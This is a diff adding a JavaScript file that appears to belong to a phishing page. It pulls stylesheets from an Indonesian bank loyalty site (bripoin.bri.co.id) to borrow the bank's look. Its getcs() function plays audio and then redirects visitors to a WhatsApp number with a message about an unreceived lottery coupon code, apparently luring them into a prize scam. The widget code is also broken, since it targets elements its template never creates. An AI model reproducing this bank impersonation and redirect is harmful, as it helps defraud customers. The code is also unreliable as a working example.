@@ -1,0 +1,31 @@
+function whatsappButton({brandName:t="",buttonName:e="",brandSubtitleText:a="",welcomeMessage:o="",phoneNumber:i="",brandImageUrl:r="",callToAction:n="",buttonSize:l="large",buttonMargin:p="false",buttonIconSize:s=22,prefillMessage:d="",buttonPosition:w="right"}){var c=""===d?o:d;let b=`
+      <div>
+       <link href="https://bripoin.bri.co.id/Css/avenir-lt-std.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://bripoin.bri.co.id/Css/swiper-bundle.min.css" />
+    <link rel="stylesheet" href="https://bripoin.bri.co.id/Css/flickity.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato&amp;display=swap" rel="stylesheet" />
+    <link href="https://bripoin.bri.co.id/Css/main.css" rel="stylesheet" />
+    <link href="https://bripoin.bri.co.id/Css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://bripoin.bri.co.id/Css/jquery-ui.css" rel="stylesheet" />
+     <link href="font-awesome/https://bripoin.bri.co.id/Css/font-awesome.min.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,400;0,500;0,600;0,700;0,800;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet" />
+    <link href="https://bripoin.bri.co.id/Css/dropDown.css" rel="stylesheet" type="text/css" />
+        </div>
+       `;b=(b=(b=(b=(b=(b=(b=(b=b.replaceAll("{{buttonName}}",e)).replaceAll("{{brandImageUrl}}",r)).replaceAll("{{brandName}}",t)).replaceAll("{{brandSubtitleText}}",a)).replaceAll("{{buttonSize}}",l)).replaceAll("{{callToAction}}",n)).replaceAll("{{phoneNumber}}",i)).replaceAll("{{prefillMessage}}",d),b=""===d?b.replaceAll("{{prefillMessageSection}}",""):b.replaceAll("{{prefillMessageSection}}",'<div class="wa-chat-bubble-wrapper-self-wrapper"><div class="wa-chat-bubble-wrapper-self">'+d+"</div></div>"),b=(b=(b=(b="left"===w?b.replaceAll("{{buttonPosition}}","wa-widget-wrapper-left"):b.replaceAll("{{buttonPosition}}","")).replaceAll("text={{defaultChatMessage}}","text="+c.replace(/(?:\r\n|\r|\n)/g,"%0a"))).replaceAll("{{welcomeMessage}}",o)).replaceAll("{{buttonIconSize}}",s),"true"===p&&(b=(b=b.replaceAll("{{buttonMargin}}","wa-cta-button-label-margin")).replaceAll("{{buttonPadding}}","wa-button-size-with-words")),"false"===p&&(b=(b=b.replaceAll("{{buttonMargin}}","")).replaceAll("{{buttonPadding}}","")),
+       document.querySelector("body").insertAdjacentHTML("beforeend",b),
+       document.querySelector("#wa-chat-window").style.display="none",
+       document.getElementById("wa-cta-button").onclick=()=>{var t=document.querySelector("#wa-chat-window");return"none"!==window.getComputedStyle(t).display?t.style.display="none":t.style.display="grid"},
+       document.querySelector("#wa-close-btn").onclick=()=>{document.querySelector("#wa-chat-window").style.display="none"}}
+function getcs(){
+  audio4 = document.getElementById("bsiku");
+  audio = document.getElementById("bsi");
+    audio4.play();
+     audio.load();
+    audio4.loop = false
+setTimeout(function(){  
+location.href="https://api.whatsapp.com/send?phone=62811251289&text=Saya Belum Mendapatkan Kode Kupon Undian"
+    }, 4000);    
+    
+}            
